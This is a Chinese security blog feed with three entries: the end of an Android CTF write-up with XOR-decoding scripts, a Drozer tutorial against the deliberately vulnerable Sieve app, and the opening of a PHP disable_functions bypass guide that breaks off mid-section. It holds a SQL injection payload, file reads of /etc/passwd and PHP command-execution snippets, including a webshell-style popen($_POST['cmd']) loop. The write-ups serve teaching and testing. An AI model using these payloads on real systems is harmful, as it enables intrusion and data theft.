title=""></a></h6><p>赋值之后就是重构apk，同上面的操作一样，不再演示。<br>现在我们开始破解账号和密码，找到LoginActivity，可以看到程序登录验证的代码，在这段代码中发现了一串字符串：2131558450，和前面的处理方式一样，还是先转换为16进制，再层层定位，最终发现了用户名</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_09-36.png" class="" title="2024-05-09_09-36.png"><h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6><p>用户名知道了，现在就剩想办法找到密码了，开始分析密码的判断条件，发现调用的m532j函数</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_09-37.png" class="" title="2024-05-09_09-37.png"><h6 id="-19"><a href="#-19" class="headerlink" title=""></a></h6><p>双击进行定位，跳转到了密码验证的地方，这段代码不难分析出，它会将我们输入的密码和2131558446进行比较</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_09-39.png" class="" title="2024-05-09_09-39.png"><h6 id="-20"><a href="#-20" class="headerlink" title=""></a></h6><p>继续重复前面的操作，发现name值是password，最后通过定位password得到了一串新的字符，也就是加密的密码</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_09-41.png" class="" title="2024-05-09_09-41.png"><h6 id="-21"><a href="#-21" class="headerlink" title=""></a></h6><p>再往下分析，发现了加密类型：MD5</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_09-52.png" class="" title="2024-05-09_09-52.png"><h6 id="-22"><a href="#-22" class="headerlink" title=""></a></h6><p>but!!!但是无法爆破出来……</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_09-42.png" class="" title="2024-05-09_09-42.png"><h6 id="-23"><a href="#-23" class="headerlink" title=""></a></h6><p>重新看了一下任务，任务中写道“this is a “recon” challenge”？？？侦查？？难不成社工？？直接搬出大Google，对用户名进行搜索，搜索到了一篇推特，难不成这就是男主？？？</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_09-45.png" class="" title="2024-05-09_09-45.png"><h6 id="-24"><a href="#-24" class="headerlink" title=""></a></h6><p>加上密码password再搜索试试，发现了密码为Guest，再加上任务中的提示：都是小写，所以密码应该为guest</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_09-49.png" class="" title="2024-05-09_09-49.png"><h6 id="-25"><a href="#-25" class="headerlink" title=""></a></h6><p>ok,万事俱备，只欠东风，登录！</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240509143644.jpg" class="" title="微信图片_20240509143644.jpg"><h6 id="-26"><a href="#-26" class="headerlink" title=""></a></h6><h2 id="the-third"><a href="#the-third" class="headerlink" title="the third"></a>the third</h2><p>登录进去之后，发现是一个聊天界面，可是我随便发送了几条信息，都是没有反应的，哎，没人理我..那就继续分析，开始追踪MessageActivity</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_09-54.png" class="" title="2024-05-09_09-54.png"><h6 id="-27"><a href="#-27" class="headerlink" title=""></a></h6><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_17-53.png" class="" title="2024-05-09_17-53.png"><h6 id="-28"><a href="#-28" class="headerlink" title=""></a></h6><p>通过分析我们可以发现，每当我们发送消息时，都会调用onSendMessage函数，而且最终的flag就在该函数中生成，而且我们输入的文本会转换成String str，随后str会传参到m530a函数里，并且调用了equals函数来检查它是否等于f2548p，继续定位f2548p</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_10-12.png" class="" title="2024-05-09_10-12.png"><h6 id="-29"><a href="#-29" class="headerlink" title=""></a></h6><p>如上图，我们定位到了f2548p的数值，并且往下看就可以看到m530a函数代码</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_10-13.png" class="" title="2024-05-09_10-13.png"><h6 id="-30"><a href="#-30" class="headerlink" title=""></a></h6><p>这个函数对我们输入的字符串进行一些异或操作，我们需要写一个脚本来还原字符串</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">p</span> = <span class="hljs-string">&quot;V@]EAASB\022WZF\022e,a$7(&amp;am2(3.\003&quot;</span><br><span class="hljs-selector-tag">p</span> = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">str</span>(p))<br><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(p) <span class="hljs-comment">// 2):</span><br><span class="hljs-selector-tag">p</span><span class="hljs-selector-attr">[i]</span> = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-selector-tag">p</span><span class="hljs-selector-attr">[i]</span>) ^ <span class="hljs-number">0</span>x32)<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-attr">[len(p) // 2 + 1 + i]</span> = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-selector-tag">p</span><span class="hljs-selector-attr">[len(p) // 2 + 1 + i]</span>) ^ <span class="hljs-number">0</span>x41)<br><br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.reverse</span>()<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span>.join(p)</span></span>)<br></code></pre></td></tr></table></figure><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_10-18.png" class="" title="2024-05-09_10-18.png"><h6 id="-31"><a href="#-31" class="headerlink" title=""></a></h6><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240509143641.jpg" class="" title="微信图片_20240509143641.jpg"><h6 id="-32"><a href="#-32" class="headerlink" title=""></a></h6><p>“if you ask nicely”…好好好不给是吧，那就继续分析m529b函数，同理，也是调用了equals函数，来检查它是否等于f2550r，继续审计发现了m529b函数的操作</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_10-24.png" class="" title="2024-05-09_10-24.png"><h6 id="-33"><a href="#-33" class="headerlink" title=""></a></h6><p>同样，写一个脚本来还原字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><br>r = <span class="hljs-string">&quot;\000dslp&#125;oQ\000 dks$|M\000h +AYQg\000P*!M$gQ\000&quot;</span><br>r = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">str</span>(r))<br>r.reverse()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(r)):<br><span class="hljs-keyword">if</span> i % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;_&quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> string.printable:<br>final_ch = <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(ch) &gt;&gt; (i % <span class="hljs-number">8</span>)) ^ <span class="hljs-built_in">ord</span>(ch))<br><span class="hljs-keyword">if</span> final_ch == r[i]:<br><span class="hljs-built_in">print</span>(ch, end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_10-28.png" class="" title="2024-05-09_10-28.png"><h6 id="-34"><a href="#-34" class="headerlink" title=""></a></h6><p>还原之后，用我们的小学英语水平，填字母还原一下，字符串为：May I <em>PLEASE</em> have the password（请告诉我密码），果然语气确实变得温柔多的，至少比刚才显得有礼貌了，果不其然，Boris也愉快的给了我们最后一个flag！</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240509143634.jpg" class="" title="微信图片_20240509143634.jpg"><h6 id="-35"><a href="#-35" class="headerlink" title=""></a></h6><p>Boris is my friend!!</p>]]></content>
    
    
    <categories>
      
      <category>移动安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Drozer-Android安全测试</title>
    <link href="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    <url>/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<p>drozer是一款针对Android系统的安全测试框架，可以帮助App和设备变得更安全，我们在使用drozer之前需要先把基本的环境做好配置，必要的环境有：jdk,python,java,系统安装配置好adb，drozer,同时模拟器或者测试手机端也需要安装好drozer agent，因为考虑到每个人的测试环境可能不同，有用linux有用windows，还有用mac的，所以就不再一一演示了，网上的教程还是很多的，也都非常easy的</p><p>我是没有用模拟器的，我嫌麻烦，直接从家里翻箱倒柜找出了我家的一部旧手机，首先也是最重要的就是开启开发者模式，每部手机开启的方式不一样，可以根据自己的手机型号进行上网搜查，开启开发者模式之后，切忌要把USB调试打开，否则adb连接不成功</p><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240508081722.jpg" class="" title="微信图片_20240508081722.jpg"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240508081703.jpg" class="" title="微信图片_20240508081703.jpg"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>通过数据线使得手机与电脑连接，然后通过adb进行测试，看是否连接正常，如果成功列出序列号则代表连接成功</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">adb devices</span><br></code></pre></td></tr></table></figure><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/2024-05-07_18-59.png" class="" title="2024-05-07_18-59.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>随后安装代理——drozer agent，可以直接通过adb install传到手机端，也可以直接从网上找到对应的apk包进行安装，安装好之后，启动即可，drozer agent会监听31415端口（drozer默认端口）所有接口传入的tcp连接数据</p><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240508081709.jpg" class="" title="微信图片_20240508081709.jpg"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>然后使用adb进行端口转发，转发到刚才代理使用的默认端口31415上</p><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/2024-05-07_18-59_1.png" class="" title="2024-05-07_18-59_1.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>最后通过下面的命令进入调试控制台</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">drozer <span class="hljs-built_in">console</span> connect<br></code></pre></td></tr></table></figure><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/2024-05-07_18-59_2.png" class="" title="2024-05-07_18-59_2.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240508081715.jpg" class="" title="微信图片_20240508081715.jpg"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>接下来的测试全部以一款Android安全测试APP——sieve进行演示</p><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240508081729.jpg" class="" title="微信图片_20240508081729.jpg"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>评估的第一步就是先在安卓设备上找到它，可以利用关键词搜索得出包名</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> app.package.list -f  关键字<br></code></pre></td></tr></table></figure><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/2024-05-07_19-05.png" class="" title="2024-05-07_19-05.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>可以看到sieve的包名叫com.mwr.example.sieve，随后通过run app.package.info可以查看包的详细信息，比如应用数据目录、apk的路径、UID、GID以及版本和应用程序所允许的权限等信息</p><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/2024-05-07_19-06.png" class="" title="2024-05-07_19-06.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>我们还可以使用drozer内置的app.package.attacksurface模块进行攻击面的识别，方便进一步的安全测试和漏洞挖掘</p><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/2024-05-07_19-10.png" class="" title="2024-05-07_19-10.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>通过上图我们可以发现，有3个activities，0个broadcast，2个content，2个services，这些都是潜在的风险入口，其中，activities组件通常就是一个单独的界面，它上面可以显示一些控件也可以监听并处理用户的事件做出响应，Activity之间通过Intent进行通信，在Intent的描述结构中，有两个最重要的部分：动作和动作对应的数据。broadcast组件通常是指BroadcastReceive广播接收器，它可以使用它对外部事件进行过滤只对感兴趣的外部事件(如当电话呼入时，或者数据网络可用时)进行接收并做出响应，广播接收器没有用户界面，然而，它们可以启动一个activity或serice 来响应它们收到的信息。content 组件可以为一个应用程序的指定数据集提供给其他应用程序，这些数据可以存储在文件系统中、在一个SQLite数据库、或以其他方式。services组件是一段长生命周期并且没有用户界面的程序，举个例子就是：一个正在从播放列表中播放歌曲的媒体播放器，在一个媒体播放器的应用中，应该会有多个activity，让使用者可以选择歌曲并播放歌曲。接下来通过暴露的这些风险来进行安全测试，首先测试activities exported绕过登陆限制，可以先用app.activity.info检测暴露的Activity信息</p><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/2024-05-07_19-13.png" class="" title="2024-05-07_19-13.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>其实根据名称就可以猜的差不多，.FileSelectActivity可能是和文件有关，.MainLoginActivity应该就是主界面，.PWList可能和密码有关（PW&#x3D;password），所以要想绕过登陆限制着重应该测试.PWList</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">run app<span class="hljs-selector-class">.activity</span><span class="hljs-selector-class">.start</span> <span class="hljs-attr">--component</span> 包的名称 .PWList<br></code></pre></td></tr></table></figure><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/2024-05-07_19-15.png" class="" title="2024-05-07_19-15.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>运行之后手机端会直接进行跳转，可以直接进入到软件内部，从而绕过了登录验证，很像我们常见的越权漏洞</p><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240508081726.jpg" class="" title="微信图片_20240508081726.jpg"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>接下来我们测试content provider，主要会存在数据库泄漏和SQL注入等问题，首先我们通过app.provider.info列举Content Provider所有的信息</p><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/2024-05-07_19-18.png" class="" title="2024-05-07_19-18.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>通过枚举uri，尽可能找出更多的存在敏感信息的路径，或者可以用drozer自带的扫描器模块进行枚举，并预测可访问内容uri的列表</p><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/2024-05-07_19-25.png" class="" title="2024-05-07_19-25.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>随后通过scanner.provider.injection模块从这些uri中检索信息，看是否存在sql注入，最终发现了三处注入</p><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/2024-05-07_19-27.png" class="" title="2024-05-07_19-27.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>看到结果先别着急去跑表和字段，先进行手注判断报错信息，看是否真实存在sql注入，因为会存在误检（手注的话需要调用selection和projection参数传递一些简单的sql语句进行测试，我直接万能单引号走起）</p><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/2024-05-07_19-29.png" class="" title="2024-05-07_19-29.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><p>可以看到明显的报错信息，接下来可以交给app.provider和scan.provider模块去跑了，有点像sqlmap</p><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/2024-05-07_19-30.png" class="" title="2024-05-07_19-30.png"><h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/2024-05-07_19-31.png" class="" title="2024-05-07_19-31.png"><h6 id="-19"><a href="#-19" class="headerlink" title=""></a></h6><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-params">--projection</span> <span class="hljs-string">&quot;* FROM Key;--&quot;</span> <span class="hljs-string">//</span>可以查询其他数据库<br></code></pre></td></tr></table></figure><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/2024-05-07_19-33.png" class="" title="2024-05-07_19-33.png"><h6 id="-20"><a href="#-20" class="headerlink" title=""></a></h6><p>还可以用app.provider.read模块以及app.provider.download模块进行文件读取和下载，像经典的&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;hosts这些都已经被广大白帽子们用来验证各种rce以及其他漏洞了，司空见惯了属于是</p><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/2024-05-07_19-38.png" class="" title="2024-05-07_19-38.png"><h6 id="-21"><a href="#-21" class="headerlink" title=""></a></h6><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/2024-05-07_19-41.png" class="" title="2024-05-07_19-41.png"><h6 id="-22"><a href="#-22" class="headerlink" title=""></a></h6><p>文件下载的话，我就用下载数据库来演示了，其他文件也是同理的</p><img src="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/2024-05-07_19-46.png" class="" title="2024-05-07_19-46.png"><h6 id="-23"><a href="#-23" class="headerlink" title=""></a></h6><p>如上图，数据库下载下来之后，可以用navicat等工具导入查看，或者直接用sqlite也可以</p>]]></content>
    
    
    <categories>
      
      <category>移动安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>APP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>disable_functions绕过</title>
    <link href="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/"/>
    <url>/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我们在日常工作中或者一些攻防项目中，可能会遇到这种情况：我们千辛万苦才拿到的Webshell，but!!!!!!!无法执行命令，并且在很多rt的面试当中也常会问到这种问题，往往特别当我们遇到php站点时，碰到函数都被禁用，将会导致我们无法进行后面的渗透工作，马上就要写完报告了、拿下这个站就可以下班了…要是突然给你来了这么一刀，这滋味只有感受过的人才会知道😭，你会甘心吗？出现这种情况大多是disable_functions的原因，disable_functions其实是放在php.ini配置文件中的一个设置参数，用来过滤止一些危险函数，但是默认情况下为空，不同开发者面临的需求和能力不同，为了实现某些特殊功能，调用的函数也会不同，当一些系统的关键函数的被禁用掉，像：system，exec,shell_exec,popen等，就会导致我们拿到shell之后，执行不了命令的原因，通常表现为：执行命令返回ret&#x3D;127，如下图</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-22.png" class="" title="2024-05-01_09-22.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>当我们想查看disable_functions或者想知道都禁用了哪些函数，可以在php.ini查看，也可以使用phpinfo();</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-12_1.png" class="" title="2024-05-01_09-12_1.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-19.png" class="" title="2024-05-01_09-19.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>今天这篇文章，主要讲一下disable_functions常见的绕过方式</p><h2 id="常规绕过"><a href="#常规绕过" class="headerlink" title="常规绕过"></a>常规绕过</h2><p>很多时候，disable functions及时限制了危险函数，也可能会有限制不全的情况，所以很有可能忽略某些危险函数，也就是我们常说的黑名单，常见的有以下几种：<br>1、exec()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>2、shell_exec()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>3、system()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>4、passthru()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">&quot;whoami&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>5、popen()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$command</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$handle</span> = <span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-variable">$command</span>,<span class="hljs-string">&quot;r&quot;</span>);<br><span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$handle</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$handle</span>, <span class="hljs-number">1024</span>);  <span class="hljs-comment">//fread($handle, 1024);</span><br>&#125;<br><span class="hljs-title function_ invoke__">pclose</span>(<span class="hljs-variable">$handle</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>6、proc_open()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$command</span>=<span class="hljs-string">&quot;ipconfig&quot;</span>;<br><span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>));<br><span class="hljs-variable">$handle</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$command</span> ,<span class="hljs-variable">$descriptorspec</span> , <span class="hljs-variable">$pipes</span>);<br><span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-number">1024</span>); <span class="hljs-comment">//fgets($pipes[1],1024);</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>等等</p><h2 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接，它最大的特点就是可以自定义在程序运行前优先加载的动态链接库，这个特点主要就是用来有选择性的载入不同动态链接库中的相同函数，然后在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库，我们通过环境变量 LD_PRELOAD 劫持系统函数，可以达到不调用 PHP 的各种命令执行函数，仍可执行系统命令的目的，说白了就是个同名函数谁能先执行的问题，使用LD_PRELOAD加持，就可以优先执行，假如我们想知道某个命令会调用系统哪些API或者哪些可执行文件的符号表，我们可用下面的命令（拿id命令举例）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">readefl -Ws `<span class="hljs-built_in">which</span> <span class="hljs-built_in">id</span>`<br></code></pre></td></tr></table></figure><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-26.png" class="" title="2024-05-01_09-26.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>不过这个命令展示的结果不代表一定会进行调用，那么我们可以通过下面的命令看到实际调用的情况</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">strace</span> -f `which id` <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-27.png" class="" title="2024-05-01_09-27.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>由于被劫持的系统函数需要由我们重新实现一次，所以函数原型必须一致，所以我们应该优先选择那些无参数并且常用的系统函数，比如getuid()，我们可以先用man命令查看一下getuid的函数原型</p><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_09-29.png" class="" title="2024-05-01_09-29.png"><h6 id="-5"><a href="#-5" class="headerlink" 